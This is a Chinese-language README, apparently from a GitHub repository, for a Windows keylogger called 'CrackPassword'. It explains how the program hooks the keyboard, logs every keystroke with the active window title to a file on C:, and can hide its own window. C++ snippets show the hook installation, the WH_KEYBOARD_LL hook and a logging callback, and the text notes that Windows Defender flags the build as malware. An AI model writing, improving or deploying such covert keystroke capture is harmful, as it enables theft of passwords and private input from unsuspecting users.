## 键盘记录器
开发语言：C++

开发工具：Visual Studio 2019

开发时间：2019.8.7

开发者：[Summer](https://github.com/zz2summer)

参考课程：[C/C++黑客技术：键盘记录器](https://www.bilibili.com/video/av56195928?from=search&seid=8623392146810887085)

项目源码参考：[C语言实现键盘记录器-源码](https://github.com/yuanyuanxiang/KeyboardRecorder/tree/master/CrackPassword)

***

一、编写Crack.dll钩子，记录键盘操作

&emsp;&emsp;源码参考：[Crack]()

二、编写使用程序 CrackPassword

&emsp;&emsp;源码参考：[CrackPassword]()

三、使用说明

&emsp;&emsp;编译之后，双击运行**CrackPassword.exe**，会弹出运行窗口，之后即会记录所有键盘操作，
生成文件**CrackPassword.dat**,保存在**C盘根目录下**，保存内容包含键盘操作的**窗口的标题**和**键盘输入**。

![Alt](runWidget.png#pic_center)

![Alt](saveFile.png#pic_center)

&emsp;&emsp;文件保存目录可在CrackPassword\CrackPassword.cpp中进行自定义修改。
```c
static FILE* pFile = fopen("C:\\CrackPassword.dat", "a+");
```

&emsp;&emsp;程序运行的显示窗口可在CrackPassword\CrackPassword.cpp中进行设置显示或者隐藏。
```c
//ShowWindow(hWnd, SW_HIDE); //隐藏程序运行窗口
ShowWindow(hWnd, SW_SHOW);   //显示程序运行窗口
```

## 代码变更历史

### [2025/01/23]

此项目 **Fork** 自[Summer](https://github.com/zz2summer)。经本人验证，编译通过，运行正常，质量较佳，实乃值得学习和借鉴的一个开源项目。

我清理了和项目无关的文件，在根目录增加单个Solution文件`KeyboardRecorder.sln`，将Crack和CrackPassword都包含进去，方便调试。

此外，我更新了初始化钩子的函数，需传递一个回调函数和用户指针，最终键盘消息将通过回调函数交由用户处理。

```c
BOOL InstallHook(Callback cb, void* user);
```

回调函数的定义如下：
```c
typedef int (CALLBACK *Callback)(const char* wnd, const char* key, void* user);
```

我保留了原作者的写文件的例子。实现了`Fwrite`回调函数：
```c
int CALLBACK Fwrite(const char* wnd, const char* key, void* user) {
	char buf[360] = {};
	sprintf_s(buf, "[%s] %s\n", wnd, key);
	return fwrite(buf, strlen(buf), 1, (FILE*)user);
}
```
在钩子初始化时，我们将`Fwrite`和文件句柄`pFile`传递到钩子中：
```c
static FILE* pFile = fopen("C:\\CrackPassword.dat", "a+");
InstallHook(Fwrite, pFile);
```

在`Fwrite`回调函数中，用户能得到窗口名称、键盘值和事先传递给`InstallHook`的指针，以便对消息进行处理。

**注意，回调函数不能阻塞!**

### [2025/01/24]

引入项目[`Keylogger`](https://github.com/GiacomoLaw/Keylogger/tree/master/windows)。
同理，修改此项目，在创建HOOK时设置回调函数，交由用户处理键盘消息记录。
以**klog_main.cpp**中EXAMPLE为例，调用`SetHook`启动钩子。
```c
SetHook(Fwrite, &output_file)
```
随后启动消息循环：
```c
MSG msg;
while (!g_shouldQuit)
{
	while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
	std::this_thread::sleep_for(std::chrono::milliseconds(20));
}
```
当有键盘消息时，由用户在回调函数Fwrite处理。

该项目使用低级钩子**WH_KEYBOARD_LL**，程序编译之后即被Windows Defender认为是恶意程序。
